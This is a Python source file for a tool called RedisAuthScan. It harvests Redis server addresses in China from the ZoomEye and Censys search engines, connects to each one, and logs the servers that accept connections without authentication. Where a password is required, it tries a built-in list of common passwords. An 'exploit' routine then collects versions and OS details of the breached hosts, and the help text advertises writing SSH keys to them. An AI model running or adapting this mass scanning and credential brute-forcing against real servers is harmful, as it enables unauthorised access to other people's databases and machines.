'''
==================================
Author: PFinal南丞
Date: 2021-09-08 11:48:34
Description:  高山仰止,景行行制,虽不能至,心向往之
==================================
'''
import json
import redis
import requests
import sys
import threading
from censys.search import CensysHosts
from queue import Queue
import zoomeye.sdk as zoomeye

yellow = '\033[01;33m'
white = '\033[01;37m'
green = '\033[01;32m'
blue = '\033[01;34m'
red = '\033[1;31m'
end = '\033[0m'

version = 'v0.1'
message = white + '{' + red + version + ' #dev' + white + '}'

redis_scan_banner = f"""
{yellow} RedisAuthScan is a tool to Scan for unauthorized {yellow}
_____          _ _                   _   _      _____                 
|  __ \        | (_)       /\        | | | |    / ____|                {message}{green}
| |__) |___  __| |_ ___   /  \  _   _| |_| |__ | (___   ___ __ _ _ __  {blue}
|  _  // _ \/ _` | / __| / /\ \| | | | __| '_ \ \___ \ / __/ _` | '_ \ {blue}
| | \ \  __/ (_| | \__ \/ ____ \ |_| | |_| | | |____) | (_| (_| | | | |{green}
|_|  \_\___|\__,_|_|___/_/    \_\__,_|\__|_| |_|_____/ \___\__,_|_| |_|{white}PFinal南丞{white}
                                                    
{red}RedisAuthScan is under development, please update before each use!{end}
"""
zm = zoomeye.ZoomEye(api_key="")


class Crawl_thread(threading.Thread):
    """ Crawl_thread """
    def __init__(self, thread_id, queue):
        threading.Thread.__init__(self)  # 需要对父类的构造函数进行初始化
        self.thread_id = thread_id
        self.queue = queue  # 任务队列

    def run(self):
        """ run """
        print('启动线程：', self.thread_id)
        self.crawl_spider()
        print('退出了该线程：', self.thread_id)

    def crawl_spider(self):
        """ crawl_spider"""
        try:
            while True:
                if self.queue.empty():  # 如果队列为空，则跳出
                    break
                else:
                    page = self.queue.get()
                    print('当前工作的线程为：', self.thread_id, " 正在采集：", page)
                    try:
                        zm.dork_search('app:"Redis key-value store" +country:"CN"', page)
                        for ip in zm.dork_filter("ip,port"):
                            data_queue.put(str(ip[0]) + ':' + str(ip[1]))  # 将采集的结果放入data_queue中
                    except Exception as e:
                        print('采集线程错误', e)
        except ValueError as e:
            print(e)


class Censys_Crawl_thread(threading.Thread):
    """ Censys_Crawl_thread """
    def __init__(self, thread_id, queue):
        threading.Thread.__init__(self)  # 需要对父类的构造函数进行初始化
        self.thread_id = thread_id
        self.queue = queue  # 任务队列
        self.client = CensysHosts(api_id="",
                                  api_secret="")

    def run(self):
        """ run """
        print('启动线程：', self.thread_id)
        self.crawl_spider()
        print('退出了该线程：', self.thread_id)

    def crawl_spider(self):
        """ crawl_spider"""
        try:
            while True:
                if self.queue.empty():  # 如果队列为空，则跳出
                    break
                else:
                    page = self.queue.get()
                    print('当前工作的线程为：', self.thread_id, " 正在采集：", page)
                    try:
                        query = self.client.search("((services.service_name: REDIS) and location.country=`China`)",
                                                   virtual_hosts='EXCLUDE',
                                                   per_page=10, pages=int(page), sort="RELEVANCE")
                        for res in query():
                            port = "6379"
                            for service in res['services']:
                                if service['service_name'] == "REDIS":
                                    port = str(service['port'])
                                    break
                            data_queue.put(str(res['ip']) + ':' + port)
                            # output.write(str(res['ip']) + ':' + port + "\n")
                    except Exception as e:
                        print('采集线程错误', e)
                        raise e
        except (Exception, ValueError) as e:
            print(e)


class Parser_thread(threading.Thread):
    """ Parser_thread """
    def __init__(self, thread_id, queue, file):
        threading.Thread.__init__(self)
        self.thread_id = thread_id
        self.queue = queue
        self.file = file

    def run(self):
        """ run """
        print('启动线程：', self.thread_id)
        while not flag:
            try:
                item = self.queue.get(False)  # get参数为false时队列为空，会抛出异常
                if not item:
                    pass
                self.parse_data(item)
                self.queue.task_done()  # 每当发出一次get操作，就会提示是否堵塞
            except Exception as e:
                print(e)
                pass

    def parse_data(self, item):
        """ parse_data  """
        passwds = ['redis', 'root', 'oracle', 'password', 'p@ssw0rd', 'abc123!', '', 'admin', 'abc123']
        try:
            redis_conn = redis.Redis(host=item.split(':')[0], port=int(item.split(':')[1]))
            redis_conn.client_list()
            redis_conn.close()
            self.file.write(item + "\n")
        except (Exception, redis.ConnectionError, redis.exceptions.InvalidResponse) as err:
            if str(err).find("Authentication") >= 0:
                for passwd in passwds:
                    try:
                        redis_conn = redis.Redis(host=item.split(':')[0], port=int(item.split(':')[1]), password=passwd,
                                                 health_check_interval=30)
                        redis_conn.client_list()
                        redis_conn.close()
                        self.file.write(item + ' auth:' + str(passwd) + "\n")
                    except (Exception, redis.ConnectionError, redis.exceptions.InvalidResponse) as e:
                        print(e)
                        continue
            else:
                print(str(err))


data_queue = Queue()  # 存放解析数据的queue
flag = False


def exploit():
    """ exploit """
    f = open("scan.txt", encoding='utf-8')
    output = open('exploited.txt', 'a', encoding='utf-8')  # 将结果保存到一个json文件中
    exploit_file = open('exploit.txt', 'a', encoding='utf-8')
    while True:
        line = f.readline()
        if line:
            try:
                pool = redis.ConnectionPool(host=line.split(':')[0], port=int(line.split(':')[1].strip()))
                r = redis.StrictRedis(connection_pool=pool)
                keys = r.keys("backup*")
                if len(keys) > 0:
                    output.write(r.info().get("redis_version") + "  " + r.info().get("os") + " " + line)
                else:
                    Version = ''
                    os = ''
                    if r.info().get("redis_version"):
                        Version = r.info().get("redis_version")
                    if r.info().get("os"):
                        os = r.info().get("os")

                    exploit_file.write(
                        line.strip() + "  " + Version + "  " + os + "\n")
            except (Exception,
                    redis.ConnectionError, ValueError, redis.exceptions.ResponseError,
                    redis.exceptions.InvalidResponse, redis.exceptions.NoScriptError) as err:
                print(err)
                continue
        else:
            break
    f.close()
    output.close()
    exploit_file.close()


def scan():
    """scan"""
    output = open('scan.txt', 'a', encoding='utf-8')  # 将结果保存到一个json文件中
    pageQueue = Queue(50)  # 任务队列，存放网页的队列
    for page in range(1, 10):
        pageQueue.put(page)  # 构造任务队列

    # 初始化采集线程
    crawl_threads = []
    crawl_name_list = ['crawl_1', 'crawl_2', 'crawl_3']  # 总共构造3个爬虫线程
    try:
        for thread_id in crawl_name_list:
            thread = Crawl_thread(thread_id, pageQueue)  # 启动爬虫线程
            thread.start()  # 启动线程
            crawl_threads.append(thread)
    except Exception as e:
        print(e)
        exit()

    # 等待队列情况，先进行网页的抓取
    while not pageQueue.empty():  # 判断是否为空
        pass  # 不为空，则继续阻塞

    # 等待所有线程结束
    for t in crawl_threads:
        t.join()

    # 初始化解析线程
    parse_thread = []
    parser_name_list = ['parse_1', 'parse_2', 'parse_3']
    for thread_id in parser_name_list:  #
        thread = Parser_thread(thread_id, data_queue, output)
        thread.start()  # 启动线程
        parse_thread.append(thread)

    # 等待队列情况，对采集的页面队列中的页面进行解析，等待所有页面解析完成
    while not data_queue.empty():
        pass
    # 通知线程退出
    global flag
    flag = True
    for t in parse_thread:
        t.join()  # 等待所有线程执行到此处再继续往下执行

    print('退出主线程')
    output.close()


def censys_scan():
    """ censys_scan """
    output = open('c_scan.txt', 'a', encoding='utf-8')  # 将结果保存到一个json文件中
    pageQueue = Queue(50)  # 任务队列，存放网页的队列
    for page in range(1, 10):
        pageQueue.put(page)  # 构造任务队列
        # 初始化采集线程
    crawl_threads = []
    crawl_name_list = ['crawl_1', 'crawl_2', 'crawl_3']  # 总共构造3个爬虫线程
    try:
        for thread_id in crawl_name_list:
            thread = Censys_Crawl_thread(thread_id, pageQueue)  # 启动爬虫线程
            thread.start()  # 启动线程
            crawl_threads.append(thread)
    except Exception as e:
        print(e)
        exit()

    # 等待队列情况，先进行网页的抓取
    while not pageQueue.empty():  # 判断是否为空
        pass  # 不为空，则继续阻塞

    # 等待所有线程结束
    for t in crawl_threads:
        t.join()

    # 初始化解析线程
    parse_thread = []
    parser_name_list = ['parse_1', 'parse_2', 'parse_3']
    for thread_id in parser_name_list:  #
        thread = Parser_thread(thread_id, data_queue, output)
        thread.start()  # 启动线程
        parse_thread.append(thread)

    # 等待队列情况，对采集的页面队列中的页面进行解析，等待所有页面解析完成
    while not data_queue.empty():
        print(123)
        pass
    # 通知线程退出
    global flag
    flag = True
    for t in parse_thread:
        t.join()  # 等待所有线程执行到此处再继续往下执行

    print('退出主线程')
    output.close()


if __name__ == '__main__':
    print(redis_scan_banner)
    if len(sys.argv[1:]) <= 0:
        print("请传递要操作的参数:   \n -s scan  \n-w  尝试连接 写入 ssh key")
        exit()
    if sys.argv[1:][0].find("-s=") >= 0:
        if sys.argv[1:][0].split("=")[1] == "zoom":
            scan()
        elif sys.argv[1:][0].split("=")[1] == "censys":
            censys_scan()
        else:
            print(f"{green}^_^ == RedisAuthScan 平台目前只支持  zoomeye，Shodan 平台扫描 {end}")
            exit()
            # scan()

    if sys.argv[1:][0] == "-e":
        exploit()
        # pass
